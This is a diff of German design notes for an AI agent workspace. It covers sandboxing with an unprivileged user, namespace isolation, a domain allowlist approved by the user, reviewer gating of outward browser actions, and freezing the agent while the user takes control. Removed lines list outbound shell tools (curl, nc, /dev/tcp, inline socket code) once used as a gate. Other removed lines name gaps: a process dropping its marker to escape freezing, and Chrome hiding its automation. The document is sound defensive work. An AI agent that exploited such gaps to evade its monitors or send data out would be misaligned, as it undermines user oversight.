@@ -440,18 +440,16 @@ dort mit ihr.
 der Harness-Kritik): Ein Halt kam bisher erst nach dem Aufruf, denn die App
 schreibt einen Schritt ins Protokoll und führt ihn sofort aus, die Runde
 eines Prüfers dauert Sekunden. Jetzt warten Aufrufe, die den Arbeitsplatz
-verlassen, auf die Prüfer. Welche, entscheidet die App nach einer festen
-Liste (`agent_gate.outward`, nie ein Modell): ein Befehl von `vm_exec` oder
-`vm_start_process`, der an einer Befehlsstelle `curl`, `wget`, `ssh`, `scp`,
-`nc`, `sendmail` u. Ä. startet (auch hinter `sudo`/`env`/`xargs`, per Pfad oder
-in `$(…)`), `rsync` zu einem fremden Rechner, `git push`, `npm publish`,
-`gh …`, `/dev/tcp/`, Inline-Code (`python -c`, `node -e`, Here-Doc) mit
-`requests`/`socket`/`fetch(` u. Ä., und im Browser `click`, `upload`,
-`key Enter` und `type … --enter` (Tippen allein sendet nichts; der Klick
-danach wird mit ihm im Blick geprüft). `pip install`, `git clone`,
-`browser open`/`read` sind normale Arbeit. Ein Skript, das der Agent vorher
-geschrieben hat und nur noch startet, sieht die Liste nicht: Dafür bleiben die
-Live-Runden das zweite Netz.
+verlassen, auf die Prüfer. Welche, entscheidet die App nach dem Werkzeug und
+seinen typisierten Argumenten (`agent_gate.outward`, nie ein Modell, nie ein
+Textmuster): beim Werkzeug `browser` die Aktionen `open`, `click`, `upload`,
+`key` mit `Enter` und `type` mit `enter` (Lesen, Tippen allein, Scrollen und
+Tabs senden nichts), und jede Domain-Anfrage (`request_domain`, die danach
+immer der Nutzer entscheidet, siehe „Netz der Werkbank“). Bis zum Umbau nach
+dem Sicherheitsaudit (2026-10-27) suchte eine Liste von Mustern in
+Shell-Befehlen nach `curl`, `git push` u. Ä.; seit die Werkbank nur noch
+Paketquellen erreicht, kann ein Befehl nichts hinausschicken, was auch
+immer er sagt, und die Muster sind weg.
 
 Ablauf: `DelegationLoop._step` öffnet das Gate (`AnswerAudit.open_gate`) vor
 dem Protokolleintrag des Schritts, damit kein Prüfer ihn zuerst in einer
@@ -510,10 +508,11 @@ VM-Restore, VM-Zeit (`/user_status` `vm_time`, Body-Klasse
 sie. `AGENT_VM_ACCESS=pro` öffnet die VM wieder für jedes Konto mit Audit
 (`agent_vm.open_to_pro`); erst setzen, wenn die Fixes aus dem Audit live sind.
 
-**Was der Agent bekommt.** Eine eigene Linux-VM pro Chat (Fly.io Sprites,
-Ubuntu, bash, sudo) mit fünf Werkzeugen (`agent_vm_tools.py`, nur auf
+**Was der Agent bekommt.** Seit 2026-10-27 die Werkbank des Arbeitsplatzes
+(Fly.io Sprites, Ubuntu, bash) als eigener Unix-Nutzer `agent` ohne sudo
+(siehe „Arbeitsplatz“) mit diesen Werkzeugen (`agent_vm_tools.py`, nur auf
 Account-Turns, nie in Chats mit Google-Daten, wie `read_source`):
-`vm_exec` (`command`, `cwd`, Standard `/home/sprite`, `timeout_seconds`,
+`vm_exec` (`command`, `cwd`, Standard der Ordner des Chats, `timeout_seconds`,
 Standard 60, höchstens `EXEC_TIMEOUT_MAX` = 300; Ergebnis `stdout`, `stderr`,
 `exit_code`, `duration_ms`, `timed_out`, `cwd`), `vm_read_file` (`path`,
 `offset`, `limit` in Zeilen, bis 16.000 Zeichen und 2 MB, eine längere einzelne
@@ -547,10 +546,19 @@ einer per `\r` überschriebenen Zeile (Fortschrittsbalken) bleibt der letzte
 Stand. Ein Befehl läuft nie länger als sein Limit und nie länger, als die
 Antwort noch Zeit lässt (`answer_time_left`; unter `MIN_COMMAND_SECONDS` = 15
 startet er nicht, „Not enough time…“). Die Grenze setzt die VM selbst
-(`timeout --kill-after=5 … bash -c`), sie gilt also auch ohne Verbindung. Die
-Login-Umgebung (PATH mit `/.sprite/bin` und `~/.local/bin`) lädt still vorweg
-(`SHELL_PRELUDE`): Die `.bashrc` der Sprite warnt sonst in jedem Befehl über
-`bind`; die Ausgabe des Befehls selbst bleibt ungefiltert.
+(`agent-run` startet den Befehl unter `timeout --kill-after=5`), sie gilt also
+auch ohne Verbindung. Die Login-Umgebung (PATH mit `/.sprite/bin` und
+`~/.local/bin`) lädt still vorweg (`SHELL_PRELUDE`): Die `.bashrc` der Sprite
+warnt sonst in jedem Befehl über `bind`; die Ausgabe des Befehls selbst bleibt
+ungefiltert. Seit 2026-10-27 außerdem `vm_install_packages` (`packages`:
+1–30 apt-Paketnamen, jeder gegen `^[a-z0-9][a-z0-9+.-]{0,99}$` geprüft und
+quotiert hinter `--`): Der Agent hat kein sudo, der Server installiert als
+root (`apt-get update` nur, wenn die Listen älter als ein Tag sind), bis
+300 s, zählt zur VM-Zeit. Python-Pakete installiert er mit pip (fällt von
+selbst auf `~/.local` zurück, gemessen) oder uv, Node-Pakete mit npm im
+Projekt (`nvm` verträgt kein eigenes `prefix`, `npx` für Werkzeuge). Dazu
+`browser` (siehe „Arbeitsplatz“) und `request_domain` (siehe „Netz der
+Werkbank“).
 Ab dem ersten VM-Start einer Nachricht ist sie ein langer Lauf mit eigenen
 Grenzen (200 Schritte, 2 Stunden statt 24 und 15 min, siehe „Lange VM-Läufe“
 unter „Tageskontingent“); VM-Aufrufe zählen nicht zur
@@ -589,27 +597,40 @@ Leerlauf ein („warm“, ohne Rechenkosten, laufende Prozesse bleiben, gemessen
 ### Arbeitsplatz (seit 2026-10-27)
 
 Max' Entscheidung 2026-10-27: Der Agent arbeitet in den Konten der Nutzer, und
-Nutzer und Agent teilen sich eine VM wie einen Arbeitsrechner. Code:
-`agent_workspace.py` (Server), `workspace_vm/` (läuft in der VM).
+Nutzer und Agent teilen sich einen Arbeitsrechner. Nach dem Sicherheitsaudit
+desselben Tages (acht Funde) sind es **zwei VMs pro Konto** (Max' Variante A):
+die **Werkbank** (`agent_vm.workspace_name`, Befehle und Dateien des Agenten)
+und der **Browser** (`agent_vm.browser_name`, Chrome, Bildschirm, VNC). Max'
+Grundsatz dabei: Der Agent wird nicht mit einprogrammierten Regeln
+(Befehls-Regexe, Textfilter) eingesperrt, er bekommt grundlegend keinen Zugriff
+auf das, was er nicht haben soll; der Schutz sitzt in der Infrastruktur
+(Unix-Nutzer, Dateirechte, Netz-Policy, getrennte VMs). Code:
+`agent_workspace.py`, `agent_browser.py`, `agent_domains.py` (Server),
+`workspace_vm/workbench/` und `workspace_vm/browser/` (laufen in den VMs).
 
+- **Zwei Namen am Konto.** `users/{uid}/chat_state/agent_workspace` trägt
+  `name` (Werkbank) und `browser`, bevor der Anbieter eine der beiden anlegt
+  (`claim`, `record_for_view`). Die Kontolöschung löscht beide über die
+  abgeleiteten Namen; Checkpoints gibt es nur von der Werkbank, die
+  Browser-VM bekommt nie einen.
 - **Ein Chat zur Zeit.** Die Sperre (`lease {chat_id, turn_id, until}`,
   `LEASE_SECONDS` = 10 min) hält, solange die Nachricht die VM nutzt; jeder
   VM-Aufruf verlängert sie, wenn weniger als 2 min übrig sind; das
   Nachrichtenende gibt sie frei, ein abgestürzter Lauf blockiert höchstens bis
   zu ihrem Ablauf. Ein anderer Chat bekommt in der Zeit `VM_BUSY` und
   antwortet ohne VM. Dieselbe Chat-Folge (eine Nachricht zur Zeit) übernimmt
-  ihre eigene Sperre.
-- **Ordner pro Chat.** `/home/sprite/chats/<chat>`: Befehle starten dort,
+  ihre eigene Sperre. Das Werkzeug `browser` nutzt dieselbe Sperre.
+- **Ordner pro Chat.** `/home/agent/chats/<chat>`: Befehle starten dort,
   relative Pfade führen dorthin, Anhänge liegen in `input`. Home, installierte
   Pakete, `~/repos` (GitHub) und der Browser sind gemeinsam. Chat löschen löscht
-  nur seinen Ordner (`delete_path`), Konto löschen den ganzen Arbeitsplatz
-  (`account_deletion` Bereich `agent_workspace`, vor den Chats).
+  nur seinen Ordner, Konto löschen beide VMs (`account_deletion` Bereich
+  `agent_workspace`, vor den Chats).
 - **Ordner mit Namen** (2026-10-27): Jeder Chat-Ordner trägt `.consens-chat`
   mit Titel, Startdatum und ID des Chats (`agent_workspace.make_chat_dir`, bei
   jeder Nachricht neu, folgt also einer Umbenennung); `cat ~/chats/*/.consens-chat`
   sagt dem Agenten, welcher Ordner zu welchem Chat gehört.
 - **Arbeitsplatz-Notizen** (2026-10-27, wie Claude Codes Memory):
-  `/home/sprite/NOTES.md` ist das Notizbuch des Agenten über Chats hinweg (was
+  `/home/agent/NOTES.md` ist das Notizbuch des Agenten über Chats hinweg (was
   wo liegt, Arbeit in Arbeit, Regeln eines Projekts). Der Anfang
   (`NOTES_CHARS` = 6.000 Zeichen) kommt mit dem ersten VM-Ergebnis jeder
   Nachricht (`workspace_notes`, `read_notes`; ein Lesefehler kostet nur die
@@ -621,45 +642,153 @@ Nutzer und Agent teilen sich eine VM wie einen Arbeitsrechner. Code:
   nur Belegtes aus den Worten des Nutzers; Arbeitsnotizen unter diesen Schutz zu
   stellen, hieße ihn zu lockern. Gegen eine Seite, die etwas in die Notizen
   schreiben lässt: Daten-Regel im Prompt, die Prüfer sehen jeden Schreibvorgang
-  live, der Nutzer kann die Datei im Browser des Arbeitsplatzes öffnen
-  (`file:///home/sprite/NOTES.md`).
-- **Werkzeuge in der VM.** `prepare` schreibt `workspace_vm/*` nach
-  `~/.consens/workspace`, `browser` nach `~/.local/bin` (chmod über die
-  Datei-API) und legt den Dienst `view` neu an (Gateway auf Port 6080; Sprites
-  startet einen Dienst bei gleicher Konfiguration sonst nicht neu), nur wenn
-  `VERSION` (Hash der Dateien) in der VM eine andere ist: sonst ein Lesezugriff.
-- **Browser.** Google Chrome auf Xvfb mit openbox, dauerhaftes Profil unter
-  `~/.consens/browser/profile` („Weitermachen, wo ich aufgehört habe“, damit
-  auch Sitzungs-Cookies einen Neustart überstehen), CDP nur auf 127.0.0.1:9222,
-  x11vnc nur auf localhost:5900. `setup.sh` installiert das einmal (~70 s,
-  Sperre gegen doppelte Läufe) und setzt eine Chrome-Richtlinie ohne
-  Passwortmanager, Karten und Adressen: Der Agent kann jede Datei der VM lesen,
-  gespeicherte Passwörter wären für ihn lesbar. `display.sh` startet, was
-  nicht läuft (eingefrorene Prozesse überstehen die Pausen).
-- **`browser` für den Agenten** (`browser.py`, Playwright über CDP): `open`,
-  `read` (Überschriften und bedienbare Elemente mit Refs `e12`; ein Ref bleibt
-  seit 2026-10-27 bei seinem Element, neue Elemente zählen über
-  `~/.consens/workspace/ref-count` weiter, keine Nummer wird zweimal vergeben,
-  ein alter Ref trifft also sein Element oder keins), `click`,
-  `type`, `select`, `upload`, `key`, `scroll`, `back`, `tabs`, `text`,
-  `screenshot` (nur wenn Text nicht reicht, dann `vm_view_image`), `wait`,
-  `status`. Jede Aktion druckt die Seite neu. Es arbeitet immer im Tab, den der
-  Nutzer sieht (`visibilityState`). Nie in Passwort- oder Code-Felder (Exit 2),
-  nie solange der Nutzer übernommen hat (Exit 3, `control.json` mit Ablauf).
-  Bildschirm, Chrome und VNC startet es ohne die Agenten-Marke
-  (`unmarked()`, `display.sh` mit `unset CONSENS_AGENT`), damit die Pause
-  sie nie einfriert.
-  Chrome meldet sich nicht als ferngesteuert (`navigator.webdriver` false, kein
-  `--enable-automation`).
-- **Live-Ansicht** (`routers/agent_workspace.py`, `workspace-view.js`): im
-  Chat über (+) → „Workspace“ (`#attachWorkspaceOption`), auf dem
-  Startbildschirm über den Knopf in der Werkzeugleiste
-  (`#composerWorkspaceButton`; die Leiste gibt es nur dort), an jedem
-  `browser`-Schritt des Agenten über „Live ansehen“ (`agent-activity.js`
-  `.agent-vm-watch`), über das Bildschirm-Symbol in der Kopfzeile des Laufs
-  neben dem Aktivitäts-Knopf, sobald ein VM-Schritt im Lauf steht
-  (`agent-delegation.js` `.agent-workspace-toggle`, per CSS `:has(.agent-vm)`),
-  und in Einstellungen → Agent → Workspace.
+  live.
+
+#### Werkbank: eigener Nutzer ohne sudo (Funde 1–3)
+
+Die Sprite führt Exec, Dienste und Datei-API als `sprite` (uid 1001) mit sudo
+ohne Passwort aus; ein Nutzer-Parameter fehlt. Deshalb:
+
+- **`agent-run`** (`workspace_vm/workbench/agent-run`, `agent_vm.agent_argv`):
+  Jeder Befehl des Agenten (`vm_exec`, Hintergrundprozesse, Entpacken eines
+  Imports, Liste der Änderungen für einen PR) läuft als
+  `sudo -n /bin/bash agent-run <Sekunden> <Ordner> <argv…>`. Der Wrapper (root)
+  tritt der cgroup `consens-agent` bei, ruft sich in einem eigenen
+  Mount-Namespace auf (`unshare --mount --propagation private`; im Namespace
+  des Anbieters verweigert er, sonst fehlte der Socket auch dem Anbieter),
+  blendet dort `/.sprite/api.sock` aus (Bind von `/dev/null`) und legt leere,
+  schreibgeschützte tmpfs über `/.sprite/checkpoints` und `/.sprite/logs`;
+  `/.sprite/bin` mit den Laufzeiten bleibt. Danach `setpriv --reuid=agent
+  --regid=agent --init-groups --no-new-privs --inh-caps=-all` mit leerer
+  Umgebung (`env -i`, HOME, PATH), `cd` in den Ordner und `timeout
+  --kill-after=5`. Exit 125 heißt: Der Namespace kam nicht zustande, nichts
+  lief.
+- **Dateien des Agenten nie über die Datei-API.** Die Datei-API schreibt als
+  `sprite`; ein Pfad des Agenten erreichte damit `/home/sprite`, auch den
+  Wrapper selbst (ein `vm_write_file` darauf wäre root gewesen). Deshalb
+  lesen, schreiben und löschen `vm_read_file`, `vm_write_file`,
+  `vm_edit_file`, `vm_view_image`, `vm_share_file`, Anhänge, Notizen und
+  Chat-Marker als Agenten-Nutzer über `agent-run` (`READ_SCRIPT`,
+  `WRITE_SCRIPT` mit den Bytes auf stdin, `DELETE_SCRIPT`; der Pfad ist ein
+  Argument, nie Befehlstext). Exit 44 fehlt, 45 Ordner, 46 nicht erlaubt;
+  „nicht erlaubt“ ist ein Fehler des Agenten (`VMFileRefused`), kein Ausfall
+  der VM. So gehören neue Dateien von selbst dem Agenten; ein `fs/chown`
+  nach dem Schreiben, wie zuerst geplant, braucht es nicht. Die Datei-API
+  nutzt nur der Server für seine eigenen Dateien in `/home/sprite/.consens`
+  (Werkzeuge, Version, `control.json`, Prozess-Aufseher).
+- **`setup.sh`** (als root, bei jeder neuen `VERSION`, `agent_workspace.prepare`):
+  legt `agent` (uid 1500, Home `/home/agent`, 700) an, nie in den Gruppen
+  `sprite` oder `sudo`, setzt `/home/sprite` auf 750; **Migration** einmalig:
+  `chats`, `NOTES.md` und `repos` ziehen aus `/home/sprite` ins neue Home
+  (chown), der Browser der alten Werkbank geht samt Profil (Chrome, Xvfb,
+  x11vnc, Gateway beendet, `~/.consens/browser` gelöscht; die Anmeldungen
+  müssen in der Browser-VM neu gemacht werden), alte Hintergrundprozesse
+  enden. `prepare` entfernt außerdem den Dienst `view` (das Gateway). Die
+  Laufzeit-Shims in `/.sprite/bin` schreiben beim ersten Aufruf Zeilen nach
+  `/etc/profile.d/languages_env` und `languages_paths` (gehören `sprite`) und
+  brechen ab, wenn das nicht geht: `setup.sh` ruft jeden Shim einmal als
+  `sprite` auf, statt die Dateien für den Agenten beschreibbar zu machen (die
+  Shells des Anbieters lesen sie). Scheitert `setup.sh`, ist die VM für die
+  Nachricht aus (`VM_UNAVAILABLE`), damit nie ein Befehl mit den Rechten des
+  Anbieters läuft.
+- **Installationen.** `vm_install_packages` (apt als root durch den Server),
+  pip/uv in `~/.local`, npm im Projekt (siehe oben).
+- **Hintergrundprozesse.** Der Aufseher (`RUNNER`) gehört dem Server: Er liegt
+  in `/home/sprite/.consens/processes/<id>`, läuft als `sprite` und hält die
+  Sprite über `api.sock` wach; nur der Befehl selbst läuft über `launch.sh`
+  (`exec sudo -n /bin/bash agent-run …`) als Agent. Stopp: TERM an `sudo`, das
+  ihn an `timeout` weitergibt; nach 10 s KILL an die ganze Sitzung des
+  Aufsehers als root (`pkill -s`).
+
+#### Netz der Werkbank (Fund 4)
+
+Die Policy der Sprite arbeitet über DNS, gilt pro VM und sofort (gesperrte
+Domain: DNS REFUSED, rohe IPs gesperrt, von innen nur lesbar).
+
+- **Standard zu** bis auf die Paketquellen (`agent_vm.WORKBENCH_RULES`):
+  `archive.ubuntu.com`, `*.archive.ubuntu.com`, `security.ubuntu.com`,
+  `ports.ubuntu.com`, `pypi.org`, `files.pythonhosted.org`,
+  `registry.npmjs.org` (die Quellen der Sprite sind archive/security, gemessen).
+  Restrisiko, von Max akzeptiert: Die npm-Registry nimmt auch Uploads (PUT).
+  github.com bleibt zu (nur `github_import`), ebenso `api.sprites.dev`.
+- **`request_domain(domain, reason)`** (`agent_domains.py`): ein Hostname,
+  ohne Schema, Pfad, Port, Wildcard oder IP; nie GitHub, Flys internes Netz
+  oder die Sprites-Adressen. Der Aufruf ist Außenwirkung (`agent_gate`): Die
+  Prüfer schätzen ihn in einer Gate-Runde ein (`GATE_DOMAIN_NOTE`: der Nutzer
+  entscheidet in jedem Fall), dann **entscheidet immer der Nutzer**
+  (`DelegationLoop._domain_wait`, Karte `agent-domain-card`: Domain, Begründung
+  des Agenten als Daten, das Urteil der Prüfer oder dass nicht jeder prüfen
+  konnte; „Allow for this chat“ = `continue`, „Don’t allow“ = neue Antwort
+  `deny`, „Write to the agent“, Stop). **Keine automatische Freigabe**, auch
+  nicht, wenn der Nutzer die Domain im Chat genannt hat: Das wäre wieder ein
+  Textfilter (Max, 2026-10-27). Eine schon erlaubte Domain braucht keine
+  Karte. Abgelehnt bekommt der Agent `DOMAIN_DENIED`.
+- **Pro Chat.** Erlaubt steht am Chat (`agent_domains`, höchstens 20, geht mit
+  ihm). Beim Lease nimmt `VMSession.ready` die Domains des Chats in die
+  Policy (`ensure(name, rules)`), eine neue Freigabe wirkt sofort
+  (`set_policy`), am Nachrichtenende geht die Policy zurück auf die
+  Paketquellen. Ein abgestürzter Lauf lässt sie bis zur nächsten Nachricht
+  stehen; Hintergrundprozesse verlieren den Zugang mit dem Ende ihrer
+  Nachricht.
+- Lesen im Web läuft weiter über `web_search` und `read_source` im Backend.
+
+#### Browser-VM (Fund 2)
+
+- **Kein Code des Agenten.** Chrome, Xvfb, openbox, x11vnc und Playwright
+  (`workspace_vm/browser/setup.sh`, einmal, ~70 s) laufen als `sprite`; der
+  Server ruft dort nur feste Programme mit festen Argumenten auf. Offenes Web
+  ohne `*.internal`/`*.flycast` (`BROWSER_RULES`). CDP nur auf 127.0.0.1:9222,
+  der VNC-Server auf keinem Netz: nur der Unix-Socket
+  `~/.consens/browser/vnc.sock` im Home des Anbieter-Nutzers (`-unixsock`,
+  `-rfbport 0 -rfbportv6 -1`). Über TCP band x11vnc IPv6-Adressen der VM, wie
+  auch immer gesagt: `-localhost` nahm `fdf::1`, das `/etc/hosts` ebenfalls
+  `localhost` nennt, `-rfbport 0` allein ließ `[::]:5900`, `-noipv6` wirkt in
+  0.9.17 nicht (gemessen an Test-Sprites 2026-10-27). Chrome speichert keine
+  Passwörter, Karten und Adressen (Richtlinie).
+- **Werkzeug `browser`** (`agent_browser.py`, statt des Shell-Befehls
+  `browser`): `action` aus `open`, `read`, `text`, `click`, `type`, `select`,
+  `key`, `scroll`, `back`, `forward`, `tabs`, `tab`, `screenshot`, `upload`,
+  `wait` mit typisierten Feldern (`url`, `ref` als `e<Zahl>`, `text`, `enter`,
+  `option`, `key` aus einer festen Liste, `direction`, `tab`, `new_tab`,
+  `offset`, `seconds`, `file`). Das Backend prüft sie (jede Aktion sagt, was
+  ihr fehlt) und ruft `workspace_vm/browser/browser.py` mit dem JSON auf stdin
+  auf, ohne Shell für die Eingabe; die Antwort ist JSON (`status`: `ok`,
+  `refused`, `user`, `setup`, `failed`). Die Logik von früher bleibt: Refs
+  bleiben bei ihrem Element (`ref-count`), Passwort- und Code-Felder zeigen nie
+  ihren Wert und nehmen nie Text, keine Aktion, solange der Nutzer übernommen
+  hat. `open` nimmt nur http(s) zu öffentlichen Adressen (nie `file://`,
+  `chrome://`, `javascript:`, `data:`, localhost, private Netze): Eine Seite
+  der VM selbst zeigte ihr Profil. `upload` liest eine Datei der Werkbank als
+  Agent (bis 15 MB), legt sie für diesen einen Aufruf in
+  `~/.consens/browser/uploads` der Browser-VM und löscht sie danach; der Helfer
+  nimmt nur Dateien aus diesem Ordner. `screenshot` kommt als Bild zum Agenten
+  (wie `vm_view_image`, nur für Bildmodelle). `open`, `click`, `upload`,
+  `key Enter` und `type` mit `enter` warten auf die Prüfer (Vorab-Prüfung).
+  Die Einrichtung läuft synchron im ersten Aufruf (bis 100 s): Im Hintergrund
+  fror sie mit der schlafenden Sprite ein (gesehen 2026-10-27). Fällt die
+  Browser-VM aus, ist nur `browser` für die Nachricht aus. Die Zeit zählt als
+  VM-Zeit.
+- **Live-Ansicht ohne Sprite-URL und Gateway** (Fund 1,
+  `routers/agent_workspace.py`, `workspace-view.js`): Der Server öffnet das
+  Exec-WebSocket von `api.sprites.dev` für `relay.py` auf der Browser-VM
+  (`exec_url`, `stdin=true`, mit eigenem `timeout` VIEW_SECONDS + 60 s).
+  `connect_upstream` verweigert jede andere Adresse; das Org-Token geht nur
+  an die API, URL-Auth der Sprite bleibt `sprite`, nie `public`. Das Relay
+  meldet seine Zustände als JSON-Zeilen auf stderr (`setup`, `starting`,
+  `ready`, `error`, als Text weiter an den Browser), danach trägt stdin
+  (`0x00`) die Bytes der Ansicht zum Unix-Socket des VNC-Servers und stdout
+  (`0x01`) seine zurück; am Ende `0x04`. Vorher lief ein Gateway-Dienst hinter der privaten
+  Adresse der Werkbank, den der Agent ändern konnte, und das Token ging an
+  diese Adresse. Eine Ansicht pro Konto, Zeitabrechnung, Ratenbegrenzung und
+  Close-Codes bleiben (4410 Stunde um, 4409 andere Ansicht, 4402 Tageszeit
+  aufgebraucht, 4429 zu oft geöffnet).
+- **Einstiege** wie bisher: im Chat über (+) → „Workspace“
+  (`#attachWorkspaceOption`), auf dem Startbildschirm über den Knopf in der
+  Werkzeugleiste (`#composerWorkspaceButton`), an jedem `browser`-Schritt des
+  Agenten über „Live ansehen“ (`agent-activity.js` `.agent-vm-watch`, seit dem
+  Umbau am Werkzeug `browser` statt an einem Shell-Befehl), über das
+  Bildschirm-Symbol in der Kopfzeile des Laufs (`agent-delegation.js`
+  `.agent-workspace-toggle`) und in Einstellungen → Agent → Workspace.
 - **Neben dem Chat** (ab 1100 px): Das Panel dockt rechts an, der Chat rückt
   in die verbleibende Spur und zentriert sich dort (`body.workspace-view-docked`,
   `--workspace-width`: Body-Innenabstand rechts, die Agent-Spalte rechnet die
@@ -668,98 +797,105 @@ Nutzer und Agent teilen sich eine VM wie einen Arbeitsrechner. Code:
   Doppelklick setzt auf halb/halb zurück; die Breite merkt sich der Browser
   (`localStorage` `consens.workspaceWidth`). Der Chat behält immer mindestens
   520 px, ein kleineres Fenster nimmt die Breite dem Arbeitsplatz. Darunter
-  deckt es den Bildschirm ganz ab. Schmale Spalten brechen den Hinweis unter dem
-  Feld per Container Query um (`components-consensus.css`). Alles
-  `.workspace-only`: Körperklasse `viewer-has-workspace` aus `/user_status`,
-  `audit_access` und `vm_time`. Ein WebSocket
-  `/agent/workspace/view`: Die erste Nachricht meldet an (`{"id_token"}`, nie in
-  der URL), dann legt der Server den Arbeitsplatz bei Bedarf an
-  (`record_for_view`, ohne Sperre: es ist der Rechner des Nutzers), bringt die
-  Werkzeuge auf Stand und verbindet sich mit dem Token über die private
-  Adresse der VM mit dem Gateway (`wss://<sprite>.sprites.app/vnc`, ohne Token
-  leitet Sprites auf die Anmeldung um). Text-Zustände `connecting`, `setup`,
-  `starting`, `ready`, `error`, danach VNC-Bytes in beide Richtungen. Nach
-  `VIEW_SECONDS` (1 h) endet eine Ansicht, weil sie die VM wach hält; das
-  Log nennt ihre Dauer („Agent workspace view closed seconds=…“). Seit dem
-  Sicherheitsaudit 2026-10-27: Pro Konto ist eine Ansicht offen, die neueste
-  gewinnt (`agent_workspace.claim_view`, Feld `view` am Konto-Dokument; eine
-  ältere sieht das binnen `VIEW_CHECK_SECONDS` und endet). Ihre offene Zeit
-  zählt als VM-Zeit (`agent_vm_time.charge`) und läuft nie über den Rest des
-  Tages. Öffnen ist auf `VIEWS_PER_MINUTE` (6) je Konto begrenzt
-  (`api_uid_limiter`). Den Grund des Endes trägt der Close-Code, weil noVNC
-  nach `ready` die Nachrichten des Sockets hat: 4410 Stunde um, 4409 andere
-  Ansicht, 4402 Tageszeit aufgebraucht, 4429 zu oft geöffnet
-  (`workspace-view.js` `CLOSED`). Der Browser lädt noVNC 1.7.0 (MPL-2.0,
-  `static/vendor/novnc/1.7.0/core/rfb.js`) erst beim ersten Öffnen und übergibt
-  ihm den Socket synchron beim Zustand `ready`, damit kein VNC-Byte verloren
-  geht.
+  deckt es den Bildschirm ganz ab. Alles `.workspace-only`: Körperklasse
+  `viewer-has-workspace` aus `/user_status`, `audit_access` und `vm_time`. Die
+  erste Nachricht des WebSockets meldet an (`{"id_token"}`, nie in der URL),
+  dann legt der Server die Browser-VM bei Bedarf an (`record_for_view`, ohne
+  Sperre: es ist der Rechner des Nutzers). Der Browser lädt noVNC 1.7.0
+  (MPL-2.0, `static/vendor/novnc/1.7.0/core/rfb.js`) erst beim ersten Öffnen
+  und übergibt ihm den Socket synchron beim Zustand `ready`, damit kein
+  VNC-Byte verloren geht.
 - **Übernehmen und Zurückgeben.** Zuerst schaut der Nutzer nur zu
   (`viewOnly`); ein Klick ins Bild übernimmt (`POST /agent/workspace/control`
-  `{"holder": "user"}` schreibt `control.json` mit Ablauf in
-  `CONTROL_SECONDS` = 90 s, die offene Ansicht erneuert alle 30 s),
-  „Zurückgeben“ oder Schließen setzt `agent`. Ein geschlossener Tab lässt die
-  Übernahme einfach ablaufen. Die Prüfer folgen dem Agenten, nicht dem
-  Nutzer.
-- **Der Agent pausiert ganz, solange der Nutzer übernommen hat** (seit
-  2026-10-27), damit nichts von ihm sieht, was der Nutzer dort tippt, etwa ein
-  Passwort. Drei Schichten, alle aus `agent_workspace.set_control`:
+  `{"holder": "user"}`, Ablauf `CONTROL_SECONDS` = 90 s, die offene Ansicht
+  erneuert alle 30 s), „Zurückgeben“ oder Schließen setzt `agent`. Ein
+  geschlossener Tab lässt die Übernahme einfach ablaufen. Die Prüfer folgen
+  dem Agenten, nicht dem Nutzer.
+- **Der Agent pausiert ganz, solange der Nutzer übernommen hat** (Fund 3),
+  damit nichts von ihm sieht, was der Nutzer dort tippt. Drei Schichten aus
+  `agent_workspace.set_control`:
   1. *Server:* Der Datensatz des Kontos trägt `control {holder, until}` (nur
-     der Server schreibt ihn). Jeder VM-Aufruf des Agenten wartet vorher
-     (`VMSession.wait_for_user`, alle `USER_POLL_SECONDS` = 2 s, höchstens
-     `USER_WAIT_SECONDS` = 120 s, nie in die Zeit der Antwort), dann läuft er;
-     dauert die Übernahme länger, hört der Agent `VM_USER_HAS_BROWSER`, und in
-     der VM lief nichts. Ein Halt der Prüfer beendet das Warten. Ein
-     Lesefehler zählt wie eine Übernahme (es wird weiter gefragt), denn
-     Schicht 3 friert nur ein, was schon läuft: Ein neuer kurzer Befehl ist
-     fertig, bevor sie hinsieht (an einer Sprite gemessen: 0,2 s).
-  2. *Browser:* `browser` handelt nicht (Exit 3), liest aber weiter.
-  3. *VM:* Jeder Befehl des Agenten läuft mit `CONSENS_AGENT=1` in der
-     Umgebung (`agent_vm.AGENT_MARK`, in `wrapped_command` per `env`), und
-     alles, was er startet, erbt sie, auch Hintergrundprozesse samt Aufseher.
-     Bei jeder Übernahme (und jeder Auffrischung) startet der Server ohne
-     Marke `workspace_vm/pause.py` (`PAUSE_COMMAND`, eine Sperrdatei hält es
-     einmalig): Es friert jeden markierten Prozess ein (SIGSTOP), sucht alle
-     0,2 s nach neuen und setzt sie fort (SIGCONT), sobald `control.json`
-     nicht mehr den Nutzer nennt, also nach „Zurückgeben“ oder dem Ablauf.
-     Die Zeitgrenzen bleiben: `timeout` ist nicht markiert und schickt nach
-     dem Signal selbst SIGCONT. Eigene Befehle des Servers (`pause.py` starten,
-     „Überall abmelden“) laufen mit `agent=False` ohne Marke.
-  Grenze: Ein Prozess, der die Marke absichtlich ablegt (`env -u`, leere
-  Umgebung), wird nicht eingefroren. Solche Befehle stehen im
-  Arbeitsprotokoll der Prüfer. Nach dem Zurückgeben gehört die Sitzung
-  (Cookies) wie vorher dem Agenten. Das Passwort selbst kommt nie in eine Datei
-  der VM, denn Chrome speichert keine Passwörter (Richtlinie in `setup.sh`).
+     der Server schreibt ihn). Jeder Aufruf des Agenten an Werkbank und
+     Browser wartet vorher (`VMSession.wait_for_user`, alle 2 s, höchstens
+     120 s, nie in die Zeit der Antwort); dauert die Übernahme länger, hört der
+     Agent `VM_USER_HAS_BROWSER`, und es lief nichts.
+  2. *Browser-VM:* `control.json` in `~/.consens/browser`; `browser.py`
+     handelt dann nicht (`status: user`).
+  3. *Werkbank:* `control.json` im Home des Servers (für den Agenten nicht
+     lesbar) und `pause.py` als root (`PAUSE_COMMAND`, eine Sperrdatei hält es
+     einmalig): Es friert die cgroup `consens-agent` ein, der jeder Befehl über
+     `agent-run` beitritt (cgroup v2, `cgroup.freeze`, an der Sprite gemessen);
+     ohne cgroup stoppt es jeden Prozess der uid 1500 (SIGSTOP, alle 0,2 s auch
+     neue) und setzt sie danach fort. Seit dem Umbau nach Nutzer statt nach
+     der Marke `CONSENS_AGENT=1` in der Umgebung, die ein Prozess ablegen
+     konnte (`env -i`, gemessen: frei laufend vorher, jetzt eingefroren). Hat
+     keine Nachricht die Werkbank je angelegt, gibt es dort nichts einzufrieren.
 - **Einfügen** (seit 2026-10-27, `workspace-view.js`): Solange der Nutzer
   übernommen hat, tippen Strg+V, Cmd+V, Umschalt+Einfg oder der Knopf
-  „Paste“ (`navigator.clipboard.readText`, nur sichtbar, wenn der Browser es
-  kann) den Text als Tastendrücke ein (`rfb.sendKey`, Latin-1 als eigener
